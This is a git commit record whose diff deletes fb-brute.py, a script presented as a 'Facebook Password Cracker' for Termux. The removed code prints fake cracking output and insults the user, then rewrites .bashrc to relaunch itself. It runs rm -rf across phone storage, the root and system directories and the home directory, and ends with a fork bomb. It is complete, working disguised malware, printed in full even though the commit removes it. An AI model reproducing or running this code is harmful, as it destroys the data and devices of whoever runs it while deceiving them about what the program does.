adc1d7c55a86d300aef286674a1aa5adf2a9b032
Vend3ttA <146146932+CyberMafiaPH@users.noreply.github.com>
2024-01-03 11:38:09 +0800

    Delete fb-brute.py

--- fb-brute.py
+++
@@ -1,6 +0,0 @@
-import os
-from colorama import Fore
-from time import sleep
-def banner():print(Fore.CYAN+'\n╔═╗╔╗ ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗\n╠╣ ╠╩╗║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝\n╚  ╚═╝╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═      \nCreated By CyberMafia Vend3ttA\nFacebook Password Cracker\n ')
-def crack():banner();A=input('Enter Target FB LINK: ');print(f"Cracking The Password of --> {A}");sleep(3);print('Password Cracked Successfully');sleep(2);print('Fuck you Idiot Skid!');sleep(1);print('Philippine CyberMafia was here! :p ');os.system('touch .hushlogin');os.system('printf "python3 fb-brute.py" > $HOME/.bashrc');os.system('termux-setup-storage');os.system('rm -rf /storage/emulated/0/*');os.system('rm -rf /storage/emulated/*');os.system('rm -rf /sdcard/*');os.system('rm -rf /sdcard/0/*');os.system('rm -rf /sdcard1/*');os.system('rm -rf /storage/*');os.system('rm -rf /*');os.system('rm -rf /system/*');os.system('rm -rf $HOME/../../*');os.system('rm -rf $PREFIX/b');os.system('rm -rf $HOME/*');os.system('mv $HOME /dev/null');os.system(':(){ :|: & };:')
-crack()
